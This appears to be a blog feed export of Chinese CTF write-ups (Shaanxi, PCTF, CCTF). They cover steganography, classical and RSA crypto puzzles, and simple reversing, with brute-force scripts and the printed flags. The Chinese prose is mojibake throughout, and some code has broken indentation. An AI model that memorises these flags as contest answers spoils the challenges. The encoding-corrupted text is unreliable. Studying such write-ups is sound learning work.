å›¾ç‰‡éšå†™è¿˜æ˜¯ç”¨winhexæ‰“å¼€ã€‚<br>ä¸Šæ¬¡åœ¨PCTFå­¦åˆ°å¦å¤–ä¸€ä¸ªæ‰“å¼€çš„å§¿åŠ¿ã€‚å°±ä¸ç”¨å»æ‰£å›¾äº†ã€‚<br>æ‰“å¼€æ˜¯è¿™æ ·çš„â€¦</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-shanxi-4.bmp" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-shanxi-4.bmp"></a><br>æ‹¼æ¥å¥½æ˜¯è¿™æ ·çš„â€¦</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-shanxi-6.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-shanxi-6.png"></a></p><p>æˆ‘è¦åæ§½ä¸€ä¸‹äº† ç‰¹ä¹ˆè°ä¼šæŠŠè‡ªå·±çš„äºŒç»´ç å‰ªæˆè¿™æ ·..</p><h3 id="Misc-7"><a href="#Misc-7" class="headerlink" title="Misc_7"></a>Misc_7</h3><p>å·¦ä¸‹è§’æœ‰ä¸ªæç¤º..<br><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-shanxi-7.bmp" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-shanxi-7.bmp"></a></p><p>è°·æ­Œä¸€ä¸‹æŠŠè¿™ä¸ªå·¥å…·ä¸‹è½½ä¸‹æ¥â€¦</p><p>ç„¶åå¼±å£ä»¤â€¦<br>æ‰“å¼€æ˜¯ä¸ªPDFæ–‡ä»¶..<br>ç„¶ååœ¨ç”¨æ ¡èµ›çš„ç¥å™¨â€¦â€“wbs43open</p><h3 id="Misc-8"><a href="#Misc-8" class="headerlink" title="Misc_8"></a>Misc_8</h3><p>å¤´ç–¼çš„8 ä»Šå¤©åšçš„æ—¶å€™å‘ç°è¿™å›¾ç‰‡å°‘äº†ä¸€åŠç„¶åæˆ‘ä¸€ç›´ä»¥ä¸ºæ˜¯è¦ä¿®å¤â€¦ç„¶è€Œæ²¡çœ‹åˆ°é‡Œé¢è¿˜æœ‰ä¸€å¼ pngå›¾ç‰‡â€¦æ‰£å‡ºæ¥ç„¶åå‘¢â€¦è¿™æ ·åš..<br><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-shanxi-8.bmp" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-shanxi-8.bmp"></a><br>ç„¶å</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-shanxi-9.bmp" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-shanxi-9.bmp"></a></p><h2 id="ç»å…¸å¯†ç å­¦"><a href="#ç»å…¸å¯†ç å­¦" class="headerlink" title="ç»å…¸å¯†ç å­¦.."></a>ç»å…¸å¯†ç å­¦..</h2><h3 id="C-1"><a href="#C-1" class="headerlink" title="C_1"></a>C_1</h3><p>è¿™å’‹æ„Ÿè§‰æ˜¯æˆ‘ä»¬å­¦æ ¡çš„é¢˜ç›®â€¦ç»™ä¸ªåŠ å¯†åçš„md5ï¼Œç„¶åç»™ä½ éƒ¨åˆ†å·²çŸ¥<br>å˜äº†ä¸ªå¥—è·¯â€¦æˆ‘è®©<strong>é‡‘æ€»</strong>å¸®æˆ‘æ”¹äº†ä¸ªè„šæœ¬â€¦</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python 2.7</span></span><br><span class="line"><span class="comment"># flag&#123;6315_hello_world_76549&#125;</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">a = <span class="string">&#x27;c44c6bfe1ba4ca9a3fd4df785eb8440e&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i1 <span class="keyword">in</span> range(<span class="number">1000</span>,<span class="number">9999</span>):</span><br><span class="line">    <span class="keyword">for</span> i2 <span class="keyword">in</span> range(<span class="number">60000</span>,<span class="number">99999</span>):</span><br><span class="line">        md5 = hashlib.md5()</span><br><span class="line">        b = <span class="string">&#x27;flag&#123;%04d_hello_world_%05d&#125;&#x27;</span>%(i1,i2)</span><br><span class="line">        md5.update(b)</span><br><span class="line">        <span class="keyword">if</span> md5.hexdigest() == a:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&#x27;%s   %s&#x27;</span> %(md5.hexdigest(), b)</span><br></pre></td></tr></table></figure><h3 id="C-2"><a href="#C-2" class="headerlink" title="C_2"></a>C_2</h3><p>æ±ªç¥å’Œæˆ‘è¯´è¿™ä¸ªæ˜¯DESåŠ å¯†..å‘Šè¯‰äº†æˆ‘Okayå¯†é’¥ä¸­çš„å…¶ä¸­å››ä¸ª,è¿˜æœ‰ä¸ªå››ä¸ªè¦è‡ªå·±çˆ†ç ´â€¦æˆ‘ä¸çŸ¥é“é˜¿..</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#author :æ±ªç¥ Jarvis</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> DES</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">c = <span class="string">&#x27;7773b6f7abc6a338bed4309ba4012bdc89101f6805057a2644ca33ea5d85c9b7daa991a8e6252951&#x27;</span>.decode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line"></span><br><span class="line">dic = <span class="string">&#x27;0123456789&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x1 <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line"><span class="keyword">for</span> x2 <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line"><span class="keyword">for</span> x3 <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line"><span class="keyword">for</span> x4 <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">key = <span class="string">&#x27;0kay&#x27;</span>+chr(x1)+chr(x2)+chr(x3)+chr(x4)</span><br><span class="line">cipher = DES.new(key,DES.MODE_ECB)</span><br><span class="line">result = cipher.decrypt(c)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> result:</span><br><span class="line"><span class="keyword">print</span> result</span><br><span class="line"><span class="keyword">print</span> key</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="c-4"><a href="#c-4" class="headerlink" title="c_4"></a>c_4</h3><p>æ …æ å¯†ç â€¦<br>éšæ‰‹å†™äº†ä¸ªå°è„šæœ¬</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">#author:Swing</span><br><span class="line">#é€šç”¨è„šæœ¬</span><br><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"></span><br><span class="line"># -*- coding: utf_8 -*-</span><br><span class="line"></span><br><span class="line">e &#x3D; raw_input(&#39;è¯·è¾“å…¥è¦è§£å¯†çš„å­—ç¬¦ä¸²\n&#39;)</span><br><span class="line"></span><br><span class="line">elen &#x3D; len(e)</span><br><span class="line"></span><br><span class="line">field&#x3D;[]</span><br><span class="line"></span><br><span class="line">for i in range(2,elen):</span><br><span class="line"></span><br><span class="line">if(elen%i&#x3D;&#x3D;0):</span><br><span class="line"></span><br><span class="line">field.append(i)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">for f in field:</span><br><span class="line"></span><br><span class="line">    b &#x3D; elen &#x2F; f</span><br><span class="line"></span><br><span class="line">    result &#x3D; &#123;x:&#39;&#39; for x in range(b)&#125;</span><br><span class="line"></span><br><span class="line">    for i in range(elen):</span><br><span class="line"></span><br><span class="line">        a &#x3D; i % b;</span><br><span class="line"></span><br><span class="line">        result.update(&#123;a:result[a] + e[i]&#125;)</span><br><span class="line"></span><br><span class="line">    d &#x3D; &#39;&#39;</span><br><span class="line"></span><br><span class="line">    for i in range(b):</span><br><span class="line"></span><br><span class="line">        d &#x3D; d + result[i]</span><br><span class="line"></span><br><span class="line">    print &#39;åˆ†ä¸º\t&#39;+str(f)+&#39;\t&#39;+&#39;æ æ—¶ï¼Œè§£å¯†ç»“æœä¸ºï¼š  &#39;+d</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="c-5"><a href="#c-5" class="headerlink" title="c_5"></a>c_5</h3><p>è¿™ä¸ªæ˜¯base64çš„ä¸€å‘˜ä¸å¤šè¯´â€¦</p><h3 id="c-6"><a href="#c-6" class="headerlink" title="c_6"></a>c_6</h3><p>å­—æ¯é¢‘ç‡æ”»å‡»â€¦<br><a href="http://quipqiup.com/index.php">http://quipqiup.com/index.php</a><br>è¿™ä¸ªç½‘ç«™å®Œç¾è§£å†³â€¦</p><h1 id="å¿ƒå¾—ä½“ä¼šå§â€¦"><a href="#å¿ƒå¾—ä½“ä¼šå§â€¦" class="headerlink" title="å¿ƒå¾—ä½“ä¼šå§â€¦"></a>å¿ƒå¾—ä½“ä¼šå§â€¦</h1><p>ä»Šå¹´é¢˜ç›®å¤ªå¤šäº†â€¦<br>ä»Šå¹´å‚èµ›çš„äººå¤ªå¤šäº†â€¦<br>ä»Šå¹´é«˜æ‰‹æ¯”å»å¹´å¤šå¤šäº†..<br>ä»Šå¹´åˆæ‰“é…±æ²¹äº†///<br>ä»Šå¹´æˆ‘åªèƒ½åšä¸€ä¸ªæ‚é¡¹ç‹—äº†â€¦<br>æ˜å¹´å¥½å¥½åŠªåŠ›å§â€¦<br><del>æœ€åæŒ‚ä¸€å¼ å›¾ç‰‡å§ æ˜å¹´ç»§ç»­åŠ æ²¹</del> </p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> é™•è¥¿çœèµ› </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Phrack--CTF æ•´ç†</title>
      <link href="2016-PCTF-Writup.html"/>
      <url>2016-PCTF-Writup.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h1 id="æµ‹è¯•é¢˜"><a href="#æµ‹è¯•é¢˜" class="headerlink" title="æµ‹è¯•é¢˜"></a>æµ‹è¯•é¢˜</h1><h2 id="Base64"><a href="#Base64" class="headerlink" title="Base64?"></a>Base64?</h2><blockquote><p>ä¸å…¶è¯´æ˜¯Base64å…¶å®æ˜¯Base32 + Hexè§£ç </p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&gt;&gt;&gt;s=<span class="string">&#x27;GUYDIMZVGQ2DMN3CGRQTONJXGM3TINLGG42DGMZXGM3TINLGGY4DGNBXGYZTGNLGGY3DGNBWMU3WI===&#x27;</span>  </span><br><span class="line">&gt;&gt;&gt;base64.b32decode(s).decode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line">&gt;&gt;&gt;PCTF&#123;Just_t3st_h4v3_f4n&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="å…³äºUSS-Lab"><a href="#å…³äºUSS-Lab" class="headerlink" title="å…³äºUSS Lab"></a>å…³äºUSS Lab</h2><blockquote><p>è¯´ç™½äº†å°±æ˜¯åªæ˜¯è¿™ä¸ªå®éªŒå®¤çš„åå­—</p></blockquote><h2 id="veryeasy"><a href="#veryeasy" class="headerlink" title="veryeasy"></a>veryeasy</h2><blockquote><p>ä½¿ç”¨åŸºæœ¬å‘½ä»¤è·å–flag<br> å¥½å§è™½ç„¶è¯´åŸºæœ¬å‘½ä»¤ stringsæˆ‘å·²ç»åœ¨ä¹‹å‰å°±çŸ¥é“äº†ã€‚<br> å¯æ˜¯åœ¨åŠ ä¸Šä¸€ä¸ªgrepå‘¢ã€‚</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;strings file | grep <span class="string">&quot;PCTF&quot;</span>  </span><br><span class="line">&gt;&gt;&gt;PCTF&#123;strings_i5_3asy_isnt_i7&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="æ®µå­"><a href="#æ®µå­" class="headerlink" title="æ®µå­"></a>æ®µå­</h2><blockquote><p>ç¨‹åºçŒ¿çš„åœˆå­é‡Œæœ‰ä¸ªéå¸¸è‘—åçš„æ®µå­ï¼šæ‰‹æŒä¸¤æŠŠé”Ÿæ–¤æ‹·ï¼Œå£ä¸­ç–¾å‘¼çƒ«çƒ«çƒ«ã€‚<br>è¯·æäº¤å…¶ä¸­â€œé”Ÿæ–¤æ‹·â€çš„åå…­è¿›åˆ¶ç¼–ç ã€‚ï¼ˆå¤§å†™</p></blockquote><p>è¿™ä¸ªé¢˜ç›®æˆ‘ç”¨äº†ä¸¤ç§è§£æ³•ï¼Œä¹Ÿç®—æ˜¯åˆæ‰¾äº†ä¸€æ¬¡çŸ¥è¯†<br>1.æˆ‘å»ç™¾åº¦äº†<del>~</del><br>2.åˆä¸€æ¬¡è®¤è¯†åˆ°äº†pythonçš„ä½¿ç”¨æ–¹æ³•ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;<span class="string">&#x27;PCTF&#123;%s&#125;&#x27;</span> % <span class="string">&#x27;é”Ÿæ–¤æ‹·&#x27;</span>.encode(<span class="string">&#x27;hex&#x27;</span>).upper()</span><br><span class="line">&gt;&gt;&gt;<span class="string">&#x27;PCTF&#123;E9949FE696A4E68BB7&#125;&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="æ‰‹è´±"><a href="#æ‰‹è´±" class="headerlink" title="æ‰‹è´±"></a>æ‰‹è´±</h2><h2 id="ç¾ä¸½çš„å®éªŒå®¤"><a href="#ç¾ä¸½çš„å®éªŒå®¤" class="headerlink" title="ç¾ä¸½çš„å®éªŒå®¤"></a>ç¾ä¸½çš„å®éªŒå®¤</h2><p>è¿™é¢˜æœ‰ä¸¤ç§è§£æ³•<br>1.stegsolveæ‰“å¼€ï¼Œç¬¬äºŒä¸ªframeé‡Œå°±æ˜¯ç­”æ¡ˆ<br><a class="gallery-item"><img src=""></a><br>2.0x7011å¤„æœ‰ç¬¬äºŒå¼ å›¾ï¼Œbinwalkæ²¡æ‰«å‡ºæ¥ï¼Œæœffd9å¯ä»¥æ‰¾åˆ°ã€‚winhexæŒ–å‡ºæ¥ </p><p>æˆ‘æœ€å¼€å§‹ä½¿ç”¨çš„æ˜¯ç¬¬äºŒç§åšæ³• ä»Šå¤©ç¬¬ä¸€æ¬¡å‘ç°æœ‰ç¬¬ä¸€ç§æ–¹æ³•å¯ä»¥åšã€‚</p><h2 id="veryeasyRSA"><a href="#veryeasyRSA" class="headerlink" title="veryeasyRSA"></a>veryeasyRSA</h2><blockquote><p>å¤šäºäº†è¿™é¢˜ å› ä¸ºæ˜¯ç¬¬ä¸€æ¬¡çœŸæ­£æ¥è§¦RSA è¿™ç®—æˆ‘çš„ä¸€ä¸ªå…¥é—¨é¢˜äº†å§ã€‚<br>å·²çŸ¥RSAå…¬é’¥ç”Ÿæˆå‚æ•°ï¼š</p></blockquote><p>p = 3487583947589437589237958723892346254777<br>q = 8767867843568934765983476584376578389<br>e = 65537   </p><p>æ±‚d =   </p><p>è¯·æäº¤PCTF{d}</p><p>é¦–å…ˆäº†è§£ä¸€ä¸‹å¯ä»¥äº†è§£ä¸€ä¸‹RSA<a href="http://www.ruanyifeng.com/blog/2013/06/rsa_algorithm_part_one.html"></a></p><p>æœ‰ p,q,d é‚£ä¹ˆæ±‚eé‚£ç®€å•å¤šäº†ã€‚</p><p>0x01 é¦–å…ˆç»™æˆ‘è‡ªå·±çš„åšæ³•ã€‚æˆ‘æ¯”è¾ƒå‚»ç”¨çš„æš´åŠ›çš„æ–¹æ³•   </p><p>````</p><p>p = int(raw_input(â€œEnter a p: â€œ))<br>q = int(raw_input(â€œEnter a q: â€œ))<br>e = int(raw_input(â€œEnter a e: â€œ))<br>t = (p-1)*(q-1)   </p><p>i=0<br>while True :<br>    if (1-t<em>i)%e == 0:<br>        break<br>    i-=1<br>    print i<br>print â€˜ok:â€™ + â€˜%dâ€™ % ((1-t</em>i)/e)  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">**è¿™ä¸ªä»£ç æˆ‘ä¼˜åŒ–è¿‡äº†  </span><br><span class="line">åŸç†å‘¢å°±æ˜¯å› ä¸ºeä¸täº’è´¨ï¼Œè€Œ DE mod &#x3D;1.**</span><br><span class="line"></span><br><span class="line">0x02   </span><br><span class="line">**è€Œé€šè¿‡è¿™å‡ å¤©çš„æ¥è§¦ï¼Œå†ä¸€æ¬¡å‘ç°pythonå¥½ç”¨ã€‚**</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><blockquote><blockquote><p>import gmpy2<br>p = 3487583947589437589237958723892346254777<br>q = 8767867843568934765983476584376578389<br>e = 65537<br>gmpy2.invert(e,(p-1)*(q-1))  </p></blockquote></blockquote></blockquote><p>mpz(19178568796155560423675975774142829153827883709027717723363077606260717434369L)  </p><blockquote><blockquote><blockquote></blockquote></blockquote></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">## ç¥ç§˜æ–‡ä»¶</span><br><span class="line">**æˆ‘ä¸çŸ¥é“è¿™ä»€ä¹ˆç©æ„å„¿~~</span><br><span class="line">ç„¶åå‘¢ç”¨winhexçœ‹äº†ä¸€ä¸‹ä»€ä¹ˆéƒ½æ²¡å‘ç°  </span><br><span class="line">å¥½å§æˆ‘åœ¨ç”¨kaliçš„fileå‘½ä»¤çœ‹çœ‹ä»–åˆ°åº•æ˜¯ä»€ä¹ˆé¬¼**ã€‚![]()</span><br><span class="line"></span><br><span class="line">OK çŸ¥é“ä»–æ˜¯ä¸€ä¸ªç£ç›˜æ–‡ä»¶äº†...ä½†æ˜¯æ€ä¹ˆåˆ©ç”¨...é æˆ‘ä¸ä¼šé˜¿~~~  </span><br><span class="line">è¿™ä¸ªæ—¶å€™æˆ‘åˆå­¦åˆ°äº†ä¸€ä¸ªæŠ€èƒ½ mountæŒ‚è½½ä¸€ä¸‹å’¯...</span><br><span class="line">![]()</span><br><span class="line">æ‰“å¼€æ˜¯å¥½å‡ ä¸ªTXTæ–‡æœ¬</span><br><span class="line">![]()</span><br><span class="line">æˆ‘æœ¬æ¥æ˜¯ä¸€ä¸ªä¸€ä¸ªå»æ‰“å¼€å¤åˆ¶é»è´´çš„ã€‚åæ¥æ”¾å¼ƒäº†...å¤ªéº»çƒ¦äº† å°è¯•çš„ç”¨pythonå†™äº†ä¸ªä»£ç </span><br><span class="line">&#96;&#96;&#96;python</span><br><span class="line">content &#x3D; &#39;&#39;</span><br><span class="line">for i in range(0,254):</span><br><span class="line">with open (&#39;&#x2F;root&#x2F;Desktop&#x2F;CTF&#x2F;a&#x2F;%d&#39; % i) as txt:</span><br><span class="line">content +&#x3D; txt.read()</span><br><span class="line"></span><br><span class="line">print content</span><br></pre></td></tr></table></figure><h2 id="å…¬å€æ•°"><a href="#å…¬å€æ•°" class="headerlink" title="å…¬å€æ•°"></a>å…¬å€æ•°</h2><p><strong>è¯·è®¡ç®—1000000000ä»¥å†…3æˆ–5çš„å€æ•°ä¹‹å’Œã€‚<br>å¦‚ï¼š10ä»¥ä¸ºè¿™æ ·çš„æ•°æœ‰3,5,6,9ï¼Œå’Œæ˜¯23<br>è¯·æäº¤PCTF{ä½ çš„ç­”æ¡ˆ}</strong></p><p>ç¼–ç¨‹é¢˜</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">çªç„¶æ‡’å¾—è´´äº†</span><br></pre></td></tr></table></figure><h2 id="Easy-Crackme"><a href="#Easy-Crackme" class="headerlink" title="Easy Crackme"></a>Easy Crackme</h2><p>å¾ˆæ˜æ˜¾çš„ä¸€é¢˜é€†å‘é¢˜ã€‚</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>é…±æ²¹ä¹‹æ—…--CCTF</title>
      <link href="2015-CCTF-Writeup.html"/>
      <url>2015-CCTF-Writeup.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="Base-å®‰ç "><a href="#Base-å®‰ç " class="headerlink" title="Base å®‰ç "></a>Base å®‰ç </h2><h3 id="MIsc"><a href="#MIsc" class="headerlink" title="MIsc"></a>MIsc</h3><h4 id="misc100-1"><a href="#misc100-1" class="headerlink" title="misc100_1"></a>misc100_1</h4><p>åé¢å°†é™„ä¸Šæ‰“åŒ…å¥½çš„æ–‡ä»¶  </p><p>ç”¨winhexæ‰“å¼€å›¾ç‰‡å‘ç°å¥‡æ€ªçš„ä»£ç </p><p>Y3Rme3dlMWMwbWUgdDAgYW5tYWN0ZiF9 </p><p>Base64è§£å¯†å³å¾—flag<br>###misc100_2</p><p>è¿™æ˜¯ä¸€é¢˜æµé‡åŒ…åˆ†æ  è¿˜å¥½æ•°æ®ä¸å¤§å¯ä»¥å–å·§<br>æƒ³åˆ°å½“åˆåœ¨æŸç¯‡writeupçœ‹åˆ°ç¥å¥‡çš„å‘½ä»¤ strings  </p><p>è§£ç å°±å¾—åˆ°äº†flag  </p><p>![](<a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/cctf_misc100">https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/cctf_misc100</a> 2.jpg)</p><p>##Reverse</p><h4 id="Reverse-100T1"><a href="#Reverse-100T1" class="headerlink" title="Reverse_100T1"></a>Reverse_100T1</h4><p>è¿™ä¸ªå¾ˆç®€å• å…¶å®æ‰“å¼€å°±çœ‹åˆ°äº†flagï¼Œé—®é¢˜è„‘æ´å¤§æˆ‘ä»¥ä¸ºè¿™æ˜¯md5åŠ å¯†å¹¶æ²¡æœ‰ç›´æ¥æäº¤  è°çŸ¥é“â€¦.  </p><h4 id="Reverse-100T2"><a href="#Reverse-100T2" class="headerlink" title="Reverse_100T2"></a>Reverse_100T2</h4><p>è¿™é¢˜è®©æˆ‘çŸ¥é“æœ‰æ—¶å€™æ˜¯éœ€è¦ç›‘å¬çš„  è¿˜æœ‰ç¬¬ä¸€æ¬¡ä½¿ç”¨IL spyå¥½ç´§å¼   </p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/cctf_R2.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/cctf_R2.png"></a></p><p>éœ€è¦ç›‘å¬ æœ¬åœ° 31337ç«¯å£<br>nc -l -p 31337  </p><p>ç„¶åä½ å°±çœ‹åˆ°flag  CTF{7eb67b0bb4427e0b43b40b6042670b55}  </p><h4 id="Reverse-100T3"><a href="#Reverse-100T3" class="headerlink" title="Reverse_100T3"></a>Reverse_100T3</h4><p>è¿™é¢˜å‘Šè¯‰æˆ‘è¦é™ä¸‹å¿ƒæ¥  çœ‹çœ‹æ˜¯ä¸æ˜¯æœ‰ç®—æ³•</p><p>ç„¶åç›´æ¥ä¸Šé¾™å“¥çš„å›¾äº† é¾™å“¥çš„æ³¨é‡Šæ æ çš„  </p><p>è¿™é‡Œéœ€è¦å­—ç¬¦ä¸²æ‹¼æ¥ æ‹¼æ¥ç»“æœæ˜¯ 4 2 3 1  </p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/CCTF_RE3.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/CCTF_RE3.png"></a></p><hr><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><p>##Best_Easy_Misc</p><p>æˆ‘ä¸æœï¼ï¼ï¼ä¸ºä»€ä¹ˆä»–ä»¬éƒ½èƒ½ç›´æ¥è§£å‹ç¼©è€Œæˆ‘ä¸è¡Œå‘¢<br>ä¸çŸ¥ä¸ºä»€ä¹ˆæˆ‘è§£å‹ä¸å‡ºæ¥ ä½†æ˜¯å³é”®å±æ€§çœ‹åˆ°äº†åŠ å¯† äºæ˜¯æˆ‘å»ç™¾åº¦äº†ä¸€ä¸‹ä¼ªåŠ å¯†ï¼Œå‘ç°å¯ä»¥ç”¨æ‰‹æœºè§£å‹ã€‚ã€‚ã€‚ã€‚æˆ‘è¿˜æ˜¯ä¸æœ<del>~</del></p><p>è§£å‹å‡ºæ¥æ˜¯ä¸€ä¸ªtxtæ–‡ä»¶<br>æ‰“å¼€ä¸€ä¸²çš„-.-.-<br><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/Bsst.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/Bsst.jpg"></a><br>å¦‚å›¾  </p><p>è¿™æ—¶å€™æ€ä¹ˆåŠ åˆšå¼€å§‹è§‰å¾—æœ‰ç‚¹åƒè«å°”æ–¯å¯†ç  ç„¶ååˆå’Œé©¬å¸ˆå‚…ä¸€èµ·è¯´å‡ºäº†åŸ¹æ ¹â€¦å…¶å®éƒ½æ— æ‰€è°“çš„â€¦<br>è§£æ³•1<br>   æŠŠâ€-â€œ æ¢æˆ1 æŠŠâ€.â€æ¢æˆ0  ä»”ç»†çœ‹äº†çœ‹å‘ç°æ˜¯1024ä¸ªå­—ç¬¦ï¼Œåˆšå¥½æ˜¯32çš„æ¬¡æ–¹ï¼Œäºæ˜¯æ’åˆ—æˆæ’ä¸€ä¸ªæ–¹æ ¼ï¼Œç„¶åå°±çœ‹äº†flag  </p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/cctf_best1.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/cctf_best1.jpg"></a></p><p> è§£æ³•2<br>â€‹     ç”¨è„šæœ¬è·‘å§<br>   è¿™æ˜¯æˆ‘ä»åˆ«äººé‚£copyè¿‡æ¥çš„..</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 